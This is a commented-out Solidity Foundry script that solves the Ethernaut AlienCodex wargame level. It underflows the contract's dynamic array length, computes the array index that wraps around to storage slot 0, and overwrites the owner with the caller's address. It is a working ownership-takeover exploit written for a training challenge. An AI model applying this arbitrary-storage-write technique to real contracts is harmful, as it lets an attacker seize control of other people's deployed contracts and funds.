// // SPDX-License-Identifier: MIT
// pragma solidity ^0.7.0;

// import{Script,console} from "forge-std/Script.sol";
// import{AlienCodex} from "../src/Level19.sol";
// contract Level19Solution is Script{
//     AlienCodex instance=AlienCodex(0xd5F8a383D6744c8385b5c86d20E40970F55714Cb);
    
//     /**
//      * Find i such that 
//      *  slot h+i=slot 0
//      *  h+i = 0
//      *  i=0-h
//      */  

     
//     function run() external{
//         console.log("owner before hack",instance.owner());
//         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
//         instance.makeContact();
//         instance.retract(); //this make underflow happen and all the storage capacity of contract is available
//         uint256 h=uint256(keccak256(abi.encode(uint256(1))));  //slot 1 contains the length of the array
//         uint256 i;  //
//         i=i-h;
//         bytes32 _content=bytes32(uint256(uint160(msg.sender)));
//         instance.revise(i, _content);
//         console.log("owner after hack",instance.owner());
//         vm.stopBroadcast();
//     }
// }